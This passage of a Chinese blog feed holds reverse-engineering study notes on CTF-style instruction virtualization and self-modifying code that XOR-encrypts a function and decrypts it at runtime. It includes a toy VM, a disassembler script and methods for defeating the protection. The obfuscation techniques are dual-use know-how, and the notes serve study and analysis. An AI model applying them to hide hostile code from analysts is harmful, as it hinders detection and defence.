id="书写机器码"><a href="#书写机器码" class="headerlink" title="书写机器码"></a><strong>书写机器码</strong></h3><p>假定希望实现的语义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> input[<span class="number">6</span>];</span><br><span class="line"><span class="type">char</span> target[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%5s&quot;</span>, input);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">input[i] ^= <span class="number">0x21</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">memcmp</span>(input, target, <span class="number">5</span>))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据我们定义的指令对其进行拆分和重构，可以得到如下机器码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> code[] = &#123;</span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="comment">// mem[0x10] = &#x27;H&#x27;</span></span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x11</span>, <span class="number">0x65</span>, <span class="comment">// mem[0x11] = &#x27;e&#x27;</span></span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x12</span>, <span class="number">0x6c</span>, <span class="comment">// mem[0x12] = &#x27;l&#x27;</span></span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x13</span>, <span class="number">0x6c</span>, <span class="comment">// mem[0x13] = &#x27;l&#x27;</span></span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x14</span>, <span class="number">0x6f</span>, <span class="comment">// mem[0x14] = &#x27;o&#x27;</span></span><br><span class="line"><span class="number">0x40</span>, <span class="comment">// scanf(&quot;%5s&quot;, &amp;mem[0]);</span></span><br><span class="line"><span class="number">0x11</span>, <span class="number">0x21</span>, <span class="comment">// r2 = 0x21</span></span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x0</span>, <span class="comment">// r1 = 0</span></span><br><span class="line"><span class="number">0x30</span>, <span class="comment">// mem[r1] ^= r2</span></span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x1</span>, <span class="comment">// r1 = 1</span></span><br><span class="line"><span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x2</span>, <span class="comment">// r1 = 2</span></span><br><span class="line"><span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x3</span>, <span class="comment">// r1 = 3</span></span><br><span class="line"><span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x4</span>, <span class="comment">// r1 = 4</span></span><br><span class="line"><span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x10</span>, <span class="number">0x5</span> <span class="comment">// return memcmp(&amp;mem[0], &amp;mem[0x10], 5);</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="初始化虚拟机"><a href="#初始化虚拟机" class="headerlink" title="初始化虚拟机"></a><strong>初始化虚拟机</strong></h3><p>在实际运行虚拟机之前，需要先对 VM 结构体进行初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VM* <span class="title function_">vm_new</span><span class="params">()</span> &#123;</span><br><span class="line">VM* vm = (VM*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(VM)); <span class="comment">// 申请内存</span></span><br><span class="line"><span class="built_in">memset</span>(vm, <span class="number">0</span>, <span class="keyword">sizeof</span>(VM)); <span class="comment">// 清空结构体字段</span></span><br><span class="line"><span class="built_in">memcpy</span>(vm-&gt;code, code, <span class="keyword">sizeof</span>(code)); <span class="comment">// 拷贝机器码</span></span><br><span class="line"><span class="keyword">return</span> vm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解释器编写"><a href="#解释器编写" class="headerlink" title="解释器编写"></a><strong>解释器编写</strong></h3><p>现在就可以来实现每条指令的 handle 以及 dispatcher 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vm_run</span><span class="params">(VM* vm)</span> &#123;</span><br><span class="line"><span class="type">char</span> opcode;</span><br><span class="line"><span class="type">char</span> operand_1, operand_2;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">opcode = vm-&gt;code[vm-&gt;eip];</span><br><span class="line"><span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">operand_1 = vm-&gt;code[vm-&gt;eip + <span class="number">1</span>];</span><br><span class="line">vm-&gt;r1 = operand_1;</span><br><span class="line">vm-&gt;eip += <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">operand_1 = vm-&gt;code[vm-&gt;eip + <span class="number">1</span>];</span><br><span class="line">vm-&gt;r2 = operand_1;</span><br><span class="line">vm-&gt;eip += <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line">operand_1 = vm-&gt;code[vm-&gt;eip + <span class="number">1</span>];</span><br><span class="line">operand_2 = vm-&gt;code[vm-&gt;eip + <span class="number">2</span>];</span><br><span class="line">vm-&gt;mem[operand_1] = operand_2;</span><br><span class="line">vm-&gt;eip += <span class="number">3</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x30</span>:</span><br><span class="line">vm-&gt;mem[vm-&gt;r1] ^= vm-&gt;r2;</span><br><span class="line">vm-&gt;eip += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x40</span>:</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%5s&quot;</span>, &amp;vm-&gt;mem[<span class="number">0</span>]);</span><br><span class="line">vm-&gt;eip += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x50</span>:</span><br><span class="line">operand_1 = vm-&gt;code[vm-&gt;eip + <span class="number">1</span>];</span><br><span class="line">operand_2 = vm-&gt;code[vm-&gt;eip + <span class="number">2</span>];</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">memcmp</span>(&amp;vm-&gt;mem[<span class="number">0</span>], &amp;vm-&gt;mem[operand_1], operand_2);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a><strong>启动</strong></h3><p>于是 main 函数可以这样写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">VM* vm = vm_new();</span><br><span class="line"><span class="keyword">if</span> (!vm_run(vm))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a><strong>解题步骤</strong></h2><p>遇到 VM 类的赛题，我们一般按照如下的步骤来解题：</p><ul><li><p>分析 VM 结构</p><ul><li>结构体大小</li><li>有哪些字段（内存、寄存器）</li></ul></li><li><p>分析指令集</p><ul><li>指令长度是否可变</li><li>每种指令的构成</li><li>每种指令的含义（伪汇编）</li><li>VM 的退出条件</li></ul></li><li><p>编写 Python 版解释器，输出伪汇编代码</p></li><li><p>阅读伪代码，分析程序流程，写出去虚拟化的原始代码</p></li><li><p>书写解题脚本</p></li></ul><p>本例中的 Python 版解释器如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x20</span>, <span class="number">0x11</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x12</span>, <span class="number">0x6c</span>, <span class="number">0x20</span>, <span class="number">0x13</span>, <span class="number">0x6c</span>,</span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x14</span>, <span class="number">0x6f</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x30</span>, <span class="number">0x10</span>, <span class="number">0x1</span>, <span class="number">0x30</span>, <span class="number">0x10</span>, <span class="number">0x2</span>,</span><br><span class="line"><span class="number">0x30</span>, <span class="number">0x10</span>, <span class="number">0x3</span>, <span class="number">0x30</span>, <span class="number">0x10</span>, <span class="number">0x4</span>, <span class="number">0x30</span>, <span class="number">0x50</span>, <span class="number">0x10</span>, <span class="number">0x5</span>]</span><br><span class="line">ip = <span class="number">0</span></span><br><span class="line">r1 = r2 = <span class="number">0</span></span><br><span class="line">mem = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">opcode = code[ip]</span><br><span class="line"><span class="keyword">if</span> opcode == <span class="number">0x10</span> :</span><br><span class="line">r1 = code[ip + <span class="number">1</span>]</span><br><span class="line">print(f<span class="string">&quot;mov r1, &#123;hex(code[ip + 1])&#125;&quot;</span>)</span><br><span class="line">ip += <span class="number">2</span></span><br><span class="line">elif opcode == <span class="number">0x11</span> :</span><br><span class="line">r2 = code[ip + <span class="number">1</span>]</span><br><span class="line">print(f<span class="string">&quot;mov r2, &#123;hex(code[ip + 1])&#125;&quot;</span>)</span><br><span class="line">ip += <span class="number">2</span></span><br><span class="line">elif opcode == <span class="number">0x20</span> :</span><br><span class="line">op1, op2 = code[ip + <span class="number">1</span>], code[ip + <span class="number">2</span>]</span><br><span class="line">mem[op1] = op2</span><br><span class="line">print(f<span class="string">&quot;mov [&#123;hex(op1)&#125;], &#123;hex(op2)&#125;&quot;</span>)</span><br><span class="line">ip += <span class="number">3</span></span><br><span class="line">elif opcode == <span class="number">0x30</span> :</span><br><span class="line">mem[r1] ^= r2</span><br><span class="line">print(f<span class="string">&quot;xor [&#123;hex(r1)&#125;], &#123;hex(r2)&#125;&quot;</span>)</span><br><span class="line">ip += <span class="number">1</span></span><br><span class="line">elif opcode == <span class="number">0x40</span> :</span><br><span class="line"><span class="meta"># flag = input().encode()</span></span><br><span class="line">flag = b<span class="string">&quot;iDMMN&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(len(flag)) :</span><br><span class="line">mem[i] = flag[i]</span><br><span class="line">ip += <span class="number">1</span></span><br><span class="line">elif opcode == <span class="number">0x50</span> :</span><br><span class="line">op1, op2 = code[ip + <span class="number">1</span>], code[ip + <span class="number">2</span>]</span><br><span class="line">print(mem[<span class="number">0</span>:op2] == mem[op1:op1 + op2])</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">raise ValueError(<span class="string">&quot;unknown opcode&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;指令虚拟化&quot;&gt;&lt;a href=&quot;#指令虚拟化&quot; class=&quot;headerlink&quot; title=&quot;指令虚拟化&quot;&gt;&lt;/a&gt;指令虚拟化&lt;/h1&gt;&lt;p&gt;虚拟机（VM）其实就是用软件来模拟硬件。我们可以仿照 x86 指令集，自己定义一套指令，在程序（解释器）中有一套函数</summary>
      
    
    
    
    
    <category term="指令虚拟化 VM" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/%E6%8C%87%E4%BB%A4%E8%99%9A%E6%8B%9F%E5%8C%96-VM/"/>
    
  </entry>
  
  <entry>
    <title>自修改代码</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/22/20240122_%E8%87%AA%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/22/20240122_%E8%87%AA%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81/</id>
    <published>2024-01-21T16:00:00.000Z</published>
    <updated>2024-01-22T16:06:59.822Z</updated>
    
    <content type="html"><![CDATA[<p>PE文件结构&#x2F;&#x2F;</p><h1 id="自修改代码"><a href="#自修改代码" class="headerlink" title="自修改代码"></a>自修改代码</h1><p>Self-Modifying Code</p><p>自修改代码（Self-Modifying Code），指在一段代码执行前对它进行修改。把代码以加密的形式保存在可执行文件中（或静态资源中），然后在程序执行的时候进行动态解密。这样我们在采用静态分析时，看到的都是加密的内容，从而减缓甚至阻止静态分析。</p><h2 id="原理与示例"><a href="#原理与示例" class="headerlink" title="原理与示例"></a>原理与示例</h2><p>SMC思路：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (运行条件满足) &#123;</span><br><span class="line">DecryptProc(Address of Check) <span class="comment">// 对 Check 代码解密</span></span><br><span class="line"><span class="comment">// ........</span></span><br><span class="line">Check(); <span class="comment">// 调用 Check</span></span><br><span class="line"><span class="comment">// ........</span></span><br><span class="line">EncryptProc(Address of Check) <span class="comment">// 再对代码进行加密，防止程序被 dump</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SMC静态分析对抗示例：</p><p>正常程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> in)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> in == <span class="number">12345</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line"><span class="keyword">if</span> (check(input))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 VS 中 Release 32 位下编译（关闭随机基址），放入 IDA 中查看：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240122225317272.png" alt="image-20240122225317272"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> _check__YAHH_Z[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x51</span>, <span class="number">0x81</span>, <span class="number">0x7D</span>, <span class="number">0x08</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0xC7</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0xFC</span>, <span class="number">0x8B</span>, <span class="number">0xE5</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在我们想把 check 函数保护起来，先把其机器码摘出来进行加密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> check[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x33</span>, <span class="number">0xC0</span>, <span class="number">0x81</span>, <span class="number">0x7D</span>, <span class="number">0x08</span>, <span class="number">0x39</span>, <span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x94</span>, <span class="number">0xC0</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(check); i++)</span><br><span class="line">&#123;</span><br><span class="line">check[i] ^= <span class="number">0x90</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, check[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c5 1b 7c c1 11 ed 98 a9 a0 90 90 e5 99 57 d5 6c 91 90 90 90 7b 97 57 d5 6c 90 90 90 90 1b d5 6c 1b 75 cd 53</span><br></pre></td></tr></table></figure><p>修改初始代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> in)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> in == <span class="number">12345</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 运行时解密 check 函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">()</span> &#123;</span><br><span class="line">DWORD old;</span><br><span class="line">VirtualProtect(check, <span class="number">4096</span>, PAGE_EXECUTE_READWRITE, &amp;old); <span class="comment">// 修改内存页权限</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">*((<span class="type">char</span>*)check + i) ^= <span class="number">0x90</span>;</span><br><span class="line">&#125;</span><br><span class="line">VirtualProtect(check, <span class="number">4096</span>, old, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">decrypt(); <span class="comment">// 新增</span></span><br><span class="line"><span class="keyword">if</span> (check(input))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新编译后，在 16 进制编辑器中找到并修改 check 函数的机器码为加密后的数据</p><p>一个具备 SMC 属性的可执行文件已经构造完成了，现在再用 IDA 进行分析：</p><p>发现原始逻辑已经被很好地隐藏了。</p><p>另一种常见的实现方法是通过新增一个具备 RWX 属性的程序段，将需要保护的代码书写在其中，这样就可以避免调用 VirtualAlloc &#x2F; VirtualProtect &#x2F; mprotect 这类 API 来暴露 SMC 的意图。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg(<span class="string">&quot;.qaq&quot;</span>)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> in)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> in == <span class="number">12345</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/SECTION:.qaq,ERW&quot;</span>)</span></span><br><span class="line"><span class="comment">// 运行时解密 check 函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++)</span><br><span class="line">*((<span class="type">char</span>*)check + i) ^= <span class="number">0x90</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> input;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">decrypt();</span><br><span class="line"><span class="keyword">if</span> (check(input))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以在 IDA 中看到新增了一个段：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240122235013392.png" alt="image-20240122235013392"></p><h2 id="对抗思路"><a href="#对抗思路" class="headerlink" title="对抗思路"></a>对抗思路</h2><p>能动态调试最好直接动态调试，因为在程序运行的某一时刻，它一定是解密完成的，这时也就暴露了，使用<strong>动态分析运行到这一时刻即可过掉保护</strong>。</p><p>其次是根据静态分析获得解密算法，写出解密脚本提前解密这段代码。</p><p>解密得到的机器码可以通过 IDAPython 的 patch_byte 接口很方便地写回。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PE文件结构&amp;#x2F;&amp;#x2F;&lt;/p&gt;
&lt;h1 id=&quot;自修改代码&quot;&gt;&lt;a href=&quot;#自修改代码&quot; class=&quot;headerlink&quot; title=&quot;自修改代码&quot;&gt;&lt;/a&gt;自修改代码&lt;/h1&gt;&lt;p&gt;Self-Modifying Code&lt;/p&gt;
&lt;p&gt;自修改代码</summary>
      
    
    
    
    
    <category term="逆向 子修改代码" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/%E9%80%86%E5%90%91-%E5%AD%90%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>花指令&amp;反调试</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/19/20240117_%E8%8A%B1%E6%8C%87%E4%BB%A4&amp;%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/19/20240117_%E8%8A%B1%E6%8C%87%E4%BB%A4&amp;%E5%8F%8D%E8%B0%83%E8%AF%95/</id>
    <published>2024-01-18T16:00:00.000Z</published>
    <updated>2024-01-22T17:09:44.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="花指令-amp-反调试"><a href="#花指令-amp-反调试" class="headerlink" title="花指令&amp;反调试"></a>花指令&amp;反调试</h1><p>2024&#x2F;01&#x2F;17</p><p>好，做道upx练手，把sublime搞崩了。后来才知道是文件没有保存用不了。<br>现在还有个问题，就是文件git不上去。。。听天由命吧</p><p>2024&#x2F;01&#x2F;18</p><p>git上去了！</p><p>方法：更改了C:\Windows\System32\drivers\etc的hosts，加了IP表，好用！（呜呜呜）</p><p>2024&#x2F;01&#x2F;19</p><p>听伯尼学长说，修改系统配置的http_proxy和https_proxy为梯子的ip，这样就可以在ping的时候走梯子了</p><p>或者直接在cmd里<code>set http_proxy=http://127.0.0.1:7890 &amp; set https_proxy=http://127.0.0.1:7890</code></p><p>欸嘿，昨天玩儿了一天，今天继续学</p><h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><p>解析失败，一般可能是花指令</p><h3 id="会被执行"><a href="#会被执行" class="headerlink" title="会被执行"></a>会被执行</h3><p>干扰静态分析*</p><h4 id="改变堆栈操作"><a href="#改变堆栈操作" class="headerlink" title="改变堆栈操作"></a>改变堆栈操作</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span 